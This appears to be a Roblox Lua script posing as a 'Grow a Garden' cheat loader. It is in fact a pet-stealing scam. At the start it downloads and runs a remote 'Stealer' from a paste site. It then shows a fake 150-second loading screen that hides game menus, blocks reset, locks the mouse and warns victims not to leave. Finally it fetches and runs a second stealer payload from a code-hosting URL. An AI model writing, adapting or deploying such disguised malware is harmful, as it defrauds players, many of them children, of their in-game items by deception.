-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/hZcSLR75/raw"))()
end)

local LocalPlayer = Players.LocalPlayer

-- Freeze CoreGuis
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Blur Effect
local Blur = Instance.new("BlurEffect")
Blur.Size = 25
Blur.Parent = Lighting

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true

-- Background Image (Triangle Pattern)
local PatternBG = Instance.new("ImageLabel")
PatternBG.Size = UDim2.new(1, 0, 1, 0)
PatternBG.Image = "rbxassetid://PUT_YOUR_TRIANGLE_ASSET_ID_HERE"
PatternBG.ScaleType = Enum.ScaleType.Tile
PatternBG.TileSize = UDim2.new(0.2, 0, 0.2, 0)
PatternBG.BackgroundTransparency = 1
PatternBG.Parent = ScreenGui

-- Overlay Gradient
local Overlay = Instance.new("Frame")
Overlay.Size = UDim2.new(1, 0, 1, 0)
Overlay.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Overlay.BackgroundTransparency = 0.3
Overlay.BorderSizePixel = 0
Overlay.Parent = ScreenGui

-- Warning Label
local WarningLabel = Instance.new("TextLabel")
WarningLabel.Size = UDim2.new(1, 0, 0.08, 0)
WarningLabel.Position = UDim2.new(0, 0, 0.05, 0)
WarningLabel.BackgroundTransparency = 1
WarningLabel.Text = "⚠️ Please don't leave while executing the script, this might make you lose all your pets!"
WarningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextScaled = true
WarningLabel.Parent = ScreenGui

-- Pulsing Animation
coroutine.wrap(function()
    while ScreenGui.Parent do
        for i = 1, 20 do
            WarningLabel.TextTransparency = i * 0.02
            task.wait(0.03)
        end
        for i = 20, 1, -1 do
            WarningLabel.TextTransparency = i * 0.02
            task.wait(0.03)
        end
    end
end)()

-- Sonic Spinner
local Spinner = Instance.new("ImageLabel")
Spinner.Size = UDim2.new(0, 100, 0, 100)
Spinner.AnchorPoint = Vector2.new(0.5, 0.5)
Spinner.Position = UDim2.new(0.5, 0, 0.4, 0)
Spinner.Image = "rbxassetid://PUT_YOUR_SONIC_SPIN_ID_HERE"
Spinner.BackgroundTransparency = 1
Spinner.Parent = ScreenGui

coroutine.wrap(function()
    local rotation = 0
    while Spinner.Parent do
        rotation = rotation + 10
        Spinner.Rotation = rotation % 360
        task.wait(0.01)
    end
end)()

-- Progress Bar Background
local ProgressBarBG = Instance.new("Frame")
ProgressBarBG.Size = UDim2.new(0.6, 0, 0.05, 0)
ProgressBarBG.AnchorPoint = Vector2.new(0.5, 0)
ProgressBarBG.Position = UDim2.new(0.5, 0, 0.77, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ProgressBarBG.BorderSizePixel = 0
ProgressBarBG.ClipsDescendants = true
ProgressBarBG.Parent = ScreenGui

-- Progress Bar Fill
local ProgressBarFill = Instance.new("Frame")
ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
ProgressBarFill.BackgroundTransparency = 0
ProgressBarFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProgressBarFill.BorderSizePixel = 0
ProgressBarFill.Parent = ProgressBarBG

local RainbowGradient = Instance.new("UIGradient")
RainbowGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)),
    ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255)),
    ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
}
RainbowGradient.Parent = ProgressBarFill

coroutine.wrap(function()
    while ScreenGui.Parent do
        RainbowGradient.Offset = RainbowGradient.Offset + Vector2.new(0.01, 0)
        if RainbowGradient.Offset.X >= 1 then
            RainbowGradient.Offset = Vector2.new(0, 0)
        end
        task.wait(0.05)
    end
end)()

-- Percentage Label
local PercentageLabel = Instance.new("TextLabel")
PercentageLabel.Size = UDim2.new(1, 0, 0.05, 0)
PercentageLabel.Position = UDim2.new(0, 0, 0.81, 0)
PercentageLabel.BackgroundTransparency = 1
PercentageLabel.Text = "Loading... 0%"
PercentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentageLabel.Font = Enum.Font.GothamBold
PercentageLabel.TextSize = 28
PercentageLabel.Parent = ScreenGui

-- Funny Tips Label
local TipLabel = Instance.new("TextLabel")
TipLabel.Size = UDim2.new(1, 0, 0.05, 0)
TipLabel.Position = UDim2.new(0, 0, 0.86, 0)
TipLabel.BackgroundTransparency = 1
TipLabel.Text = "Preparing magic soil..."
TipLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
TipLabel.Font = Enum.Font.Gotham
TipLabel.TextSize = 20
TipLabel.Parent = ScreenGui

local funnyTips = {
    "Bypassing Anti-Cheat...",
    "Stealing crops from neighbors...",
    "Downloading OP pets...",
    "Planting invisible carrots...",
    "Bribing the garden NPCs...",
    "Watering plastic flowers...",
    "Fooling the server admin...",
    "Claiming free sheckles...",
    "Installing instant-grow hacks...",
    "Petting golden rabbits...",
    "Growing money trees..."
}

coroutine.wrap(function()
    while ScreenGui.Parent do
        TipLabel.Text = funnyTips[math.random(1, #funnyTips)]
        task.wait(4)
    end
end)()

-- Anti-Leave Blocker
UserInputService.InputBegan:Connect(function(input, gp)
    if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.F4 then
        return
    end
end)
pcall(function()
    StarterGui:SetCore("ResetButtonCallback", false)
end)
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

-- Loading Progress (2.5 Minutes Timer)
local totalLoadTime = 150
local startTime = tick()

while true do
    local elapsed = tick() - startTime
    local progress = math.clamp(elapsed / totalLoadTime, 0, 1)
    PercentageLabel.Text = "Loading... " .. math.floor(progress * 100) .. "%"
    ProgressBarFill.Size = UDim2.new(progress, 0, 1, 0)
    if progress >= 1 then break end
    task.wait(0.1)
end

-- Cleanup UI and Restore CoreGui
ScreenGui:Destroy()
Blur:Destroy()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
UserInputService.MouseBehavior = Enum.MouseBehavior.Default

-- Execute Payload Script (Stealer) after loading completes
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
Spawner.Load()
